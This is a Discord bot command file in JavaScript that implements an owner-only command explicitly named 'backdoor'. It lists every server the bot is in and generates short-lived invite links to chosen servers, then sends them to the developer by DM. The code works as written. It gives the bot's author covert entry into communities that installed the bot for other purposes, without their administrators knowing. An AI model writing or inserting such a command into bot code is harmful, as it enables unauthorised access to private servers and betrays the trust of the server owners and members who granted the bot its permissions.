const { MessageEmbed } = require('discord.js')

module.exports.run = async ( client, message, args ) => {

  if (!args.length) {

    let cd = ''

    client.guilds.cache.each( guild => {

      if (cd.length > 1500) return

      cd += `Join ${guild.name} with id: ${guild.id}\n`
    })

    return message.channel.send(`\`\`\`xl\n${cd}\n\`\`\``)

  } else {

    let errors = []
    let invites = []

    let action = args.map( arg => getInvite(client, arg, errors, invites))

    await Promise.all(action)

    if (!invites.length && errors.length > 0) return message.channel.send( new MessageEmbed().setColor('RED').setDescription(errors.join('\n\n')))

    if (invites.length > 1 && errors.length > 0) return message.author.send( new MessageEmbed().setColor('GREEN').setDescription(invites.join('\n\n'))).then(()=> message.channel.send( new MessageEmbed().setColor('RED').setDescription(`**${invites.length} ${invites.length > 1 ? 'invites' : 'invite'}** were created with the following Errors:\n\n${errors.join('\n')}\n\nPlease Check your DM`))).catch(()=> message.channel.send( new MessageEmbed().setColor('RED').setDescription('Could not send Invite Link. Please open your DM channel.')))

    message.author.send( new MessageEmbed().setColor('GREEN').setDescription(invites.join('\n\n'))).then(()=> message.channel.send(new MessageEmbed().setColor('GREEN').setDescription(`Created **${invites.length}** invite ${invites.length > 1 ? 'links' : 'link'}! Please check your DM!`))).catch(()=> message.channel.send( new MessageEmbed().setColor('RED').setDescription('Could not send Invite Link. Please open your DM channel.')))
  }
}

module.exports.config = {
  name: "backdoor",
  aliases: ['getinvite','getinv','forceinv','bd'],
  group: 'owner',
  description: 'Sends a server invite to the specified server. Only the developer can use this!',
  examples: ['backdoor [server ID]','bd'],
  parameters: ['server ID'],
  ownerOnly: true
}

function getInvite(client , id, errors, invites ){

  return new Promise( async (resolve) => {

    if (/\b[0-9]{18}\b/g.test(id)){

      const guild = client.guilds.cache.get(id)

      if (guild)  {

      const invite = await guild.channels.cache.filter(c => c.type === 'text' ).first().createInvite({ maxAge: 120, maxUses: 1 }).then( invite => {

      if (!invite || invite === undefined) resolve(errors.push(` • Could not create an Invite for **${guild.name}**!`))

      resolve(invites.push(` • **[Click here](https://discord.gg/${invite.code})** to join ${guild.name}!`))

      }).catch(() => resolve(errors.push(` • Could not create an Invite for **${guild.name}**!`)))

    } else resolve(errors.push(` • Could not get guild with ID: **${id}**`))

    } else resolve(errors.push(` • **${id}** is not a valid guild ID!`))

  })
}
